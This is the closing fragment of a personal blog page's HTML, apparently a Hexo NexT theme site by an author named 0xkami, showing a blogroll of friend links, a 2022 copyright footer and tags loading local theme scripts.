          <a href="https://belyenochi.github.io/" title="https:&#x2F;&#x2F;belyenochi.github.io&#x2F;" rel="noopener" target="_blank">belyenochi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://nooothing.top/archives/" title="http:&#x2F;&#x2F;nooothing.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">nothing</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://yukikay.github.io/" title="https:&#x2F;&#x2F;yukikay.github.io&#x2F;" rel="noopener" target="_blank">kay</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://kam1.cc/" title="https:&#x2F;&#x2F;kam1.cc&#x2F;" rel="noopener" target="_blank">kam1</a>
        </li>
    </ul>
  </div>

      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0xkami</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
